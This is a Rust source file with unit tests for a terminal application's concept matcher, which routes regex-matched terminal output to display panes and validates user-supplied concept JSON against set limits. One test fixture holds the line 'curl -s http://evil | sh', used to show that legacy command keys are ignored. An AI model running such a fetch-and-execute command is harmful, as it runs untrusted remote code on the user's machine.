//! Concept matching — regex triggers over terminal output that route a
//! captured block of output to a pane.
//!
//! Every line of terminal output is tested against every registered
//! [`Concept`]'s regex trigger. The first enabled concept that matches
//! starts a capture in the engine; the captured text is later delivered to
//! the pane kind named by the concept's [`Action::target_label`]. A concept
//! never injects input into a PTY — capture and display only.
//!
//! These are **pure functions** — no I/O, no async, no channels. They are
//! called from the engine's terminal tasks.

use crate::types::{CaptureMode, Concept};
use regex::{Regex, RegexSet};

/// Test every concept's regex against `line`.
///
/// Returns the name, capture mode, and target label of the concept that should
/// handle the line, so the engine can start a capture or publish a notice.
/// Disabled concepts are skipped entirely.
///
/// Precedence is deliberate: a **capture outranks a notify**. Both modes are
/// "first match wins" within their own class, but when a notify-only concept
/// and a capturing concept both match the same line, the capture is returned —
/// otherwise a broad notify-only concept ordered first would silently consume
/// every line and the capture would never fire (the notify event still being
/// published made that look like normal operation).
pub fn match_line(concepts: &[Concept], line: &str) -> Option<(String, CaptureMode, String)> {
    let mut notify = None;
    for concept in concepts {
        if !concept.enabled || !concept.trigger_regex.is_match(line) {
            continue;
        }
        // Conditions are extra predicates over the same line: all of them must
        // match for the concept to fire, so they can only narrow the match.
        if !concept.conditions.iter().all(|re| re.is_match(line)) {
            continue;
        }
        let target = concept
            .destinations
            .first()
            .map(|a| a.target_label.clone())
            .unwrap_or_default();
        match concept.capture_mode {
            CaptureMode::UntilStop { .. } => {
                return Some((concept.name.clone(), concept.capture_mode, target));
            }
            CaptureMode::SingleLine => {
                notify.get_or_insert_with(|| (concept.name.clone(), concept.capture_mode, target));
            }
        }
    }
    notify
}

/// A concept set compiled for matching: the concepts plus a [`RegexSet`] gate
/// over their triggers.
///
/// The aggregate cost of matching is lines × concepts × regex, and the plain
/// per-concept loop pays each regex's own prologue on every line — measured at
/// ~20 ns per concept per line, so a 128-concept library spends 2.7 µs on a
/// line that matches nothing: a pane flooded with short lines fell from
/// 47 MB/s to 8.6 MB/s. The gate answers "could anything match" in one
/// combined pass over the line, and only a hit pays for the ordered loop that
/// decides capture-vs-notify (measured 12× cheaper at the realistic end —
/// 128 typical triggers on 200-byte lines — and 128× at the caps' worst case).
///
/// The gate cannot change a verdict: it is built from the same trigger
/// regexes, conditions are still evaluated by [`match_line`], and a gate that
/// matched nothing proves no trigger can match.
pub struct ConceptMatcher {
    concepts: Vec<Concept>,
    /// `None` when nothing is enabled (there is nothing to match) or the
    /// combined set failed to compile — the per-concept loop is the fallback
    /// either way, and the failure is reported rather than silently slow.
    gate: Option<RegexSet>,
}

impl ConceptMatcher {
    pub fn new(concepts: Vec<Concept>) -> Self {
        let patterns: Vec<&str> = concepts
            .iter()
            .filter(|c| c.enabled)
            .map(|c| c.trigger_regex.as_str())
            .collect();
        let gate = if patterns.is_empty() {
            None
        } else {
            match RegexSet::new(&patterns) {
                Ok(set) => Some(set),
                Err(e) => {
                    log::warn!(
                        "concept prefilter unavailable, every line takes the per-concept loop: {e}"
                    );
                    None
                }
            }
        };
        Self { concepts, gate }
    }

    pub fn concepts(&self) -> &[Concept] {
        &self.concepts
    }

    /// [`match_line`]'s verdict for `line`, behind the combined gate.
    pub fn match_line(&self, line: &str) -> Option<(String, CaptureMode, String)> {
        if self.gate.as_ref().is_some_and(|gate| !gate.is_match(line)) {
            return None;
        }
        match_line(&self.concepts, line)
    }
}

/// Caps applied when parsing concept definitions from JSON.
///
/// Concepts arrive from user-editable config files (`user://concepts.json`)
/// and their triggers are matched against every line of terminal output —
/// unbounded counts, regexes, or capture timeouts would be DoS vectors.
pub const MAX_CONCEPTS: usize = 128;
pub const MAX_TRIGGER_LEN: usize = 1024;
pub const MAX_ACTIONS: usize = 32;
pub const MAX_CONDITIONS: usize = 8;
pub const MAX_STOP_TIMEOUT_MS: u64 = 600_000;

/// Compile `pattern` in the dialect the engine actually matches with.
fn compile_pattern(pattern: &str) -> Result<Regex, String> {
    if pattern.is_empty() {
        return Err("empty pattern".to_string());
    }
    if pattern.len() > MAX_TRIGGER_LEN {
        return Err(format!("pattern exceeds the {MAX_TRIGGER_LEN}-byte limit"));
    }
    Regex::new(pattern).map_err(|e| e.to_string())
}

/// Validate a regex against the engine's matching dialect.
///
/// This is the authority the concept editor must ask: the engine matches with
/// the Rust `regex` crate, which rejects look-around and backreferences that
/// GDScript's PCRE2 accepts. `concepts_from_json` silently drops a concept
/// carrying such a pattern, so validating engine-side is the only way to know
/// whether a user-authored regex will actually load.
pub fn validate_pattern(pattern: &str) -> Result<(), String> {
    compile_pattern(pattern).map(|_| ())
}

/// Parse a concept's optional `conditions` array into compiled regexes.
///
/// Conditions narrow a match: every one must match the same line the trigger
/// matched. Dropping a condition that cannot be parsed would *widen* matching,
/// the unsafe direction, so anything not fully understood is an error the
/// caller turns into a rejected concept.
fn parse_conditions(value: Option<&serde_json::Value>) -> Result<Vec<Regex>, String> {
    let Some(value) = value else {
        return Ok(Vec::new());
    };
    if value.is_null() {
        return Ok(Vec::new());
    }
    let Some(entries) = value.as_array() else {
        return Err("\"conditions\" must be an array of regex strings".to_string());
    };
    if entries.len() > MAX_CONDITIONS {
        return Err(format!(
            "{} conditions exceeds the limit of {MAX_CONDITIONS}",
            entries.len()
        ));
    }
    let mut conditions = Vec::with_capacity(entries.len());
    for entry in entries {
        let Some(pattern) = entry.as_str() else {
            return Err("every condition must be a regex string".to_string());
        };
        let re = compile_pattern(pattern)
            .map_err(|e| format!("condition '{pattern}' is invalid: {e}"))?;
        conditions.push(re);
    }
    Ok(conditions)
}

/// Parse concept definitions from the JSON payload pushed by GDScript
/// (an Array of objects). Invalid entries are skipped; counts, lengths,
/// and the capture timeout are capped per the `MAX_*` constants. The
/// timeout clamp prevents `Instant::now() + Duration` overflow panics
/// in the engine.
///
/// An entry whose `conditions` cannot be parsed in full is skipped rather
/// than partially kept: dropping a condition would widen matching.
pub fn concepts_from_json(json: &str) -> Vec<Concept> {
    use crate::types::Action;

    let Ok(value) = serde_json::from_str::<serde_json::Value>(json) else {
        return Vec::new();
    };
    let serde_json::Value::Array(arr) = value else {
        return Vec::new();
    };
    let mut concepts = Vec::new();
    let mut truncated = false;
    for item in &arr {
        if concepts.len() >= MAX_CONCEPTS {
            truncated = true;
            break;
        }
        let name = item["name"].as_str().unwrap_or("").to_string();
        if name.is_empty() || name.len() > 256 {
            continue;
        }
        let trigger = item["trigger"].as_str().unwrap_or("");
        if trigger.is_empty() || trigger.len() > MAX_TRIGGER_LEN {
            continue;
        }
        let Ok(re) = Regex::new(trigger) else {
            continue;
        };
        // A malformed conditions list rejects the whole concept: a silently
        // dropped condition would widen matching (see `parse_conditions`).
        let conditions = match parse_conditions(item.get("conditions")) {
            Ok(conditions) => conditions,
            Err(reason) => {
                log::warn!("concept '{name}' rejected: {reason}");
                continue;
            }
        };
        let enabled = item["enabled"].as_bool().unwrap_or(true);
        // `single_line` is notify-only: the match is published as an event and
        // nothing is captured or routed. Anything else (including a missing or
        // unknown value) captures until a stop condition, because capture is
        // what the concept editor writes and what the shipped set uses.
        let stop_ms = item["stop_timeout_ms"]
            .as_u64()
            .unwrap_or(300)
            .clamp(1, MAX_STOP_TIMEOUT_MS);
        let stop_input = item["stop_on_input"].as_bool().unwrap_or(true);
        let cap_mode = match item["capture_mode"].as_str() {
            Some("single_line") => CaptureMode::SingleLine,
            _ => CaptureMode::UntilStop {
                stop_timeout_ms: stop_ms,
                stop_on_input: stop_input,
            },
        };
        // Only the routing target is read. A legacy `cmd` key is ignored —
        // concept definitions are data, never something to execute.
        let mut actions = Vec::new();
        if let Some(acts) = item["actions"].as_array() {
            for a in acts {
                let target = a["target"].as_str().unwrap_or("").to_string();
                if !target.is_empty() {
                    actions.push(Action {
                        target_label: target,
                    });
                }
            }
            actions.truncate(MAX_ACTIONS);
        }
        concepts.push(Concept {
            name,
            trigger_regex: re,
            conditions,
            enabled,
            capture_mode: cap_mode,
            destinations: actions,
        });
    }
    if truncated {
        log::warn!("concept limit reached: only the first {MAX_CONCEPTS} concepts were loaded");
    }
    concepts
}

// ═══════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::Action;
    use regex::Regex;

    fn make_concept(name: &str, pattern: &str, target: &str) -> Concept {
        Concept {
            name: name.into(),
            trigger_regex: Regex::new(pattern).unwrap(),
            conditions: vec![],
            enabled: true,
            capture_mode: CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            },
            destinations: vec![Action {
                target_label: target.into(),
            }],
        }
    }

    fn with_conditions(mut concept: Concept, patterns: &[&str]) -> Concept {
        concept.conditions = patterns.iter().map(|p| Regex::new(p).unwrap()).collect();
        concept
    }

    // ── match_line ─────────────────────────────────────────────────

    #[test]
    fn match_line_no_match_returns_none() {
        let concepts = vec![make_concept("crash", "crash", "x")];
        assert!(match_line(&concepts, "all good").is_none());
    }

    #[test]
    fn match_line_returns_name_mode_and_target() {
        let concepts = vec![make_concept(
            "cat_cmd",
            r"(?:^|[$#>]\s)\bcat\s+\S",
            "code_viewer",
        )];
        let (name, mode, target) = match_line(&concepts, "> cat file.txt").expect("should match");
        assert_eq!(name, "cat_cmd");
        assert_eq!(target, "code_viewer");
        assert_eq!(
            mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            }
        );
    }

    #[test]
    fn match_line_first_match_wins() {
        let concepts = vec![
            make_concept("a", "alpha", "x"),
            make_concept("b", "alpha", "y"),
        ];
        let (name, _, target) = match_line(&concepts, "alpha release").expect("should match");
        assert_eq!(name, "a");
        assert_eq!(target, "x");
    }

    #[test]
    fn match_line_prefers_a_capture_over_a_notify() {
        // A broad notify-only concept ordered first must not consume the line:
        // the capture would never fire, and the notify event still being
        // published made that look like normal operation.
        let mut notify = make_concept("broad_notify", "alpha", "none");
        notify.capture_mode = CaptureMode::SingleLine;
        let capture = make_concept("narrow_capture", "alpha", "code_viewer");
        let concepts = vec![notify, capture];

        let (name, mode, target) = match_line(&concepts, "alpha release").expect("should match");
        assert_eq!(name, "narrow_capture", "capture outranks notify");
        assert_eq!(target, "code_viewer");
        assert!(matches!(mode, CaptureMode::UntilStop { .. }));
    }

    #[test]
    fn match_line_returns_a_notify_when_nothing_captures() {
        let mut notify = make_concept("broad_notify", "alpha", "none");
        notify.capture_mode = CaptureMode::SingleLine;
        let (name, mode, _) = match_line(&[notify], "alpha release").expect("should match");
        assert_eq!(name, "broad_notify");
        assert_eq!(mode, CaptureMode::SingleLine);
    }

    #[test]
    fn match_line_skips_disabled() {
        let mut c = make_concept("off", "crash", "x");
        c.enabled = false;
        assert!(match_line(&[c], "crash detected").is_none());
    }

    #[test]
    fn match_line_without_destination_reports_empty_target() {
        let mut c = make_concept("c", "crash", "unused");
        c.destinations.clear();
        let (_, _, target) = match_line(&[c], "crash").expect("should match");
        assert_eq!(target, "");
    }

    /// Conditions are ANDed with the trigger over the same line: every one
    /// must match, and they never stand in for the trigger.
    #[test]
    fn match_line_requires_every_condition() {
        let line = "deploy prod ok";

        let all_hold = with_conditions(
            make_concept("deploy", "deploy", "code_viewer"),
            &["prod", r"\bok\b"],
        );
        let (name, _, target) = match_line(&[all_hold], line).expect("all conditions hold");
        assert_eq!(name, "deploy");
        assert_eq!(target, "code_viewer");

        let one_missing = with_conditions(
            make_concept("deploy", "deploy", "code_viewer"),
            &["prod", r"\bstaging\b"],
        );
        assert!(
            match_line(&[one_missing], line).is_none(),
            "the trigger matched but one condition did not"
        );

        let trigger_absent =
            with_conditions(make_concept("deploy", "deploy", "code_viewer"), &["prod"]);
        assert!(
            match_line(&[trigger_absent], "prod ok").is_none(),
            "conditions never stand in for the trigger"
        );
    }

    /// Conditions gate notify-only concepts too: they are predicates on the
    /// line, independent of the capture mode.
    #[test]
    fn match_line_conditions_apply_to_notify_concepts() {
        let mut notify = with_conditions(make_concept("n", "alpha", "none"), &["beta"]);
        notify.capture_mode = CaptureMode::SingleLine;
        assert!(match_line(&[notify.clone()], "alpha beta").is_some());
        assert!(match_line(&[notify], "alpha gamma").is_none());
    }

    /// A concept whose conditions fail must not consume the line: a later
    /// concept that matches still fires.
    #[test]
    fn match_line_falls_through_when_conditions_fail() {
        let gated = with_conditions(make_concept("gated", "alpha", "x"), &["never"]);
        let plain = make_concept("plain", "alpha", "y");
        let (name, _, target) =
            match_line(&[gated, plain], "alpha release").expect("the plain concept matches");
        assert_eq!(name, "plain");
        assert_eq!(target, "y");
    }

    // ── concepts_from_json ────────────────────────────────────────

    #[test]
    fn concepts_from_json_rejects_invalid_input() {
        assert!(concepts_from_json("not json").is_empty());
        assert!(concepts_from_json("{\"a\":1}").is_empty());
    }

    #[test]
    fn concepts_from_json_skips_invalid_regex_and_bad_names() {
        let json = r#"[
            {"name": "", "trigger": "x"},
            {"name": "ok", "trigger": "("},
            {"name": "good", "trigger": "^cat",
             "actions": [{"target": "code_viewer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].name, "good");
    }

    /// A concept file is data, never a command: a legacy `cmd` key must not
    /// survive parsing into the engine's vocabulary.
    #[test]
    fn concepts_from_json_ignores_legacy_command_templates() {
        let json = r#"[
            {"name": "x", "trigger": "boom",
             "actions": [{"cmd": "curl -s http://evil | sh", "target": "code_viewer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].destinations.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "code_viewer");
    }

    /// `single_line` is notify-only: the match is published as an event and
    /// nothing is captured.
    #[test]
    fn concepts_from_json_single_line_is_notify_only() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "single_line",
             "actions": [{"target": "inspector"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].capture_mode, CaptureMode::SingleLine);
    }

    /// A missing or unknown `capture_mode` captures — the concept editor writes
    /// `until_stop` explicitly, and capture is the shipped behaviour.
    #[test]
    fn concepts_from_json_defaults_to_capture() {
        let json = r#"[{"name": "c", "trigger": "x", "capture_mode": "typo"}]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(
            concepts[0].capture_mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            }
        );
    }

    #[test]
    fn concepts_from_json_applies_stop_knobs() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "until_stop",
             "stop_timeout_ms": 600, "stop_on_input": false}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(
            concepts[0].capture_mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 600,
                stop_on_input: false,
            }
        );
    }

    #[test]
    fn concepts_from_json_preserves_legacy_observer_target() {
        let json = r#"[
            {"name": "test_failure", "trigger": "fail", "capture_mode": "until_stop",
             "actions": [{"cmd": "", "target": "observer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "observer");
    }

    #[test]
    fn concepts_from_json_clamps_timeout() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "until_stop",
             "stop_timeout_ms": 4000000000}
        ]"#;
        let concepts = concepts_from_json(json);
        let CaptureMode::UntilStop {
            stop_timeout_ms, ..
        } = concepts[0].capture_mode
        else {
            panic!("an until_stop concept must parse as a capture");
        };
        assert_eq!(stop_timeout_ms, MAX_STOP_TIMEOUT_MS);
    }

    #[test]
    fn concepts_from_json_truncates_count() {
        let mut items = String::from("[");
        for i in 0..(MAX_CONCEPTS + 10) {
            if i > 0 {
                items.push(',');
            }
            items.push_str(&format!(r#"{{"name": "c{i}", "trigger": "x"}}"#));
        }
        items.push(']');
        assert_eq!(concepts_from_json(&items).len(), MAX_CONCEPTS);
    }

    #[test]
    fn concepts_from_json_skips_oversized_trigger() {
        let long = "a".repeat(MAX_TRIGGER_LEN + 1);
        let json = format!(r#"[{{"name": "c", "trigger": "{long}"}}]"#);
        assert!(concepts_from_json(&json).is_empty());
    }

    #[test]
    fn concepts_from_json_caps_actions() {
        let mut acts = String::new();
        for i in 0..(MAX_ACTIONS + 10) {
            if i > 0 {
                acts.push(',');
            }
            acts.push_str(&format!(r#"{{"target": "t{i}"}}"#));
        }
        let json = format!(r#"[{{"name": "c", "trigger": "x", "actions": [{acts}]}}]"#);
        let concepts = concepts_from_json(&json);
        assert_eq!(concepts[0].destinations.len(), MAX_ACTIONS);
        assert_eq!(concepts[0].destinations[0].target_label, "t0");
    }

    #[test]
    fn concepts_from_json_skips_empty_and_non_string_targets() {
        let json = r#"[
            {"name": "c", "trigger": "x",
             "actions": [{"target": ""}, {"target": 7}, {"target": "ok"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts[0].destinations.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "ok");
    }

    // ── conditions ────────────────────────────────────────────────

    #[test]
    fn validate_pattern_speaks_the_engine_dialect() {
        assert!(validate_pattern(r"^\s*error\b").is_ok());
        assert_eq!(validate_pattern("").unwrap_err(), "empty pattern");

        let oversized = "a".repeat(MAX_TRIGGER_LEN + 1);
        let err = validate_pattern(&oversized).unwrap_err();
        assert!(
            err.contains(&MAX_TRIGGER_LEN.to_string()),
            "the cap must be named: {err}"
        );

        // PCRE2 (GDScript's RegEx) accepts look-around; the engine's `regex`
        // crate does not, and `concepts_from_json` drops such a concept.
        assert!(validate_pattern("(?=x)y").is_err());
        assert!(validate_pattern("(?<=x)y").is_err());
    }

    #[test]
    fn concepts_from_json_keeps_valid_conditions() {
        let json = r#"[
            {"name": "deploy", "trigger": "deploy", "conditions": ["prod", "\\bok\\b"]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].conditions.len(), 2);
        assert!(concepts[0].conditions[0].is_match("prod build"));
        assert!(concepts[0].conditions[1].is_match("ok"));
        // The parsed conditions are live predicates, not decoration.
        assert_eq!(
            match_line(&concepts, "deploy prod ok")
                .map(|(n, _, _)| n)
                .as_deref(),
            Some("deploy")
        );
        assert!(match_line(&concepts, "deploy prod failed").is_none());
    }

    #[test]
    fn concepts_from_json_accepts_an_empty_conditions_array() {
        let json = r#"[{"name": "c", "trigger": "x", "conditions": []}]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert!(concepts[0].conditions.is_empty());
    }

    /// Dropping an unparseable condition would widen matching, so every
    /// rejection path drops the whole concept.
    #[test]
    fn concepts_from_json_rejects_unparseable_conditions() {
        for conditions in [
            r#""prod""#,      // not an array
            r#"["("]"#,       // does not compile
            r#"[""]"#,        // empty pattern
            r#"["ok", 7]"#,   // an entry is not a string
            r#"["(?<=x)y"]"#, // look-behind: PCRE2-only, not engine dialect
        ] {
            let json = format!(r#"[{{"name": "c", "trigger": "x", "conditions": {conditions}}}]"#);
            assert!(
                concepts_from_json(&json).is_empty(),
                "conditions {conditions} must reject the concept"
            );
        }
    }

    #[test]
    fn concepts_from_json_rejects_over_cap_conditions() {
        let entries: Vec<String> = (0..=MAX_CONDITIONS).map(|i| format!("\"ok{i}\"")).collect();
        let json = format!(
            r#"[{{"name": "c", "trigger": "x", "conditions": [{}]}}]"#,
            entries.join(",")
        );
        assert!(concepts_from_json(&json).is_empty());
    }

    #[test]
    fn concepts_from_json_rejects_oversized_condition() {
        let long = "a".repeat(MAX_TRIGGER_LEN + 1);
        let json = format!(r#"[{{"name": "c", "trigger": "x", "conditions": ["{long}"]}}]"#);
        assert!(concepts_from_json(&json).is_empty());
    }

    // ── ConceptMatcher (the engine's gated entry point) ──────────────

    /// The gate must never change a verdict — it may only skip the
    /// per-concept loop when no trigger can match. Every (set, line) pair is
    /// checked through both paths, including the two cases where the gate
    /// hits and the verdict is still `None` (a failing condition, a disabled
    /// concept), which is what a gate built from triggers alone must not get
    /// wrong.
    #[test]
    fn matcher_agrees_with_match_line_on_every_pair() {
        let concepts = concepts_from_json(
            r#"[
                {"name": "cond", "trigger": "build", "conditions": ["error"],
                 "actions": [{"target": "code_viewer"}]},
                {"name": "notify", "trigger": "warning", "capture_mode": "single_line",
                 "actions": [{"target": "inspector"}]},
                {"name": "off", "trigger": "everything", "enabled": false},
                {"name": "plain", "trigger": "cat\\s+\\S",
                 "actions": [{"target": "code_viewer"}]}
            ]"#,
        );
        assert_eq!(
            concepts.len(),
            4,
            "the fixture must parse into four concepts"
        );
        let matcher = ConceptMatcher::new(concepts.clone());

        let lines = [
            "build error: missing field", // gate hits, condition passes
            "build clean",                // gate hits, condition fails
            "a warning appeared",         // gate hits, notify only
            "everything",                 // gate hits, concept disabled
            "cat src/main.rs",            // gate hits, plain capture
            "unrelated output",           // gate empty
            "",
        ];
        let mut matched = 0;
        for line in lines {
            let expected = match_line(&concepts, line);
            assert_eq!(
                matcher.match_line(line),
                expected,
                "the matcher changed the verdict for {line:?}"
            );
            matched += usize::from(expected.is_some());
        }
        assert_eq!(
            matched, 3,
            "the fixture must exercise capture, condition, and notify"
        );
    }

    #[test]
    fn matcher_with_nothing_enabled_matches_nothing() {
        let concepts =
            concepts_from_json(r#"[{"name": "off", "trigger": "anything", "enabled": false}]"#);
        let matcher = ConceptMatcher::new(concepts);
        assert!(matcher.match_line("anything at all").is_none());
        assert!(matcher.match_line("").is_none());
    }
}
